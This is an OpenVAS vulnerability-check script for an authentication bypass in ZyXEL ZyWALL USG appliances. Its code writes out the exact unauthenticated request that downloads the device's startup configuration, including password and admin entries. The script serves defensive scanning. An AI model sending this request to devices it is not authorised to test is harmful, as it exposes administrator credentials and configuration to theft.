###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zywall_usg_47707.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Multiple ZyWALL USG Products Remote Security Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Multiple ZyWALL USG products are prone to a security-bypass
vulnerability.

Successful exploits may allow attackers to bypass certain security
restrictions and perform unauthorized actions.

Note: Reportedly, the firmware is also prone to a weakness that allows
      password-protected upgrade files to be decrypted with a known
      plaintext attack.

The following products are vulnerable:

ZyWALL USG-20 ZyWALL USG-20W ZyWALL USG-50 ZyWALL USG-100 ZyWALL USG-
200 ZyWALL USG-300 ZyWALL USG-1000 ZyWALL USG-1050 ZyWALL USG-2000";

tag_solution = "Reportedly, the issue is fixed; however, Symantec has not confirmed
this. Please contact the vendor for more information.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103161");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-05-12 13:24:44 +0200 (Thu, 12 May 2011)");
 script_bugtraq_id(47707);
 script_tag(name:"cvss_base", value:"2.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");

 script_name("Multiple ZyWALL USG Products Remote Security Bypass Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/47707");
 script_xref(name : "URL" , value : "http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-003/-authentication-bypass-in-configuration-import-and-export-of-zyxel-zywall-usg-appliances");
 script_xref(name : "URL" , value : "http://www.zyxel.in");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 443);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:443);
if(!get_port_state(port))exit(0);

url = string("/"); 

if(http_vuln_check(port:port, url:url,pattern:"<title>ZyWALL USG")) {

  url = string("/cgi-bin/export-cgi/images/?category=config&arg0=startup-config.conf");

  if(http_vuln_check(port:port, url:url, pattern:"model: ZyWALL USG", extra_check:make_list("password","interface","user-type admin"))) {
    security_message(port:port);
    exit(0);
  }  

}

exit(0);

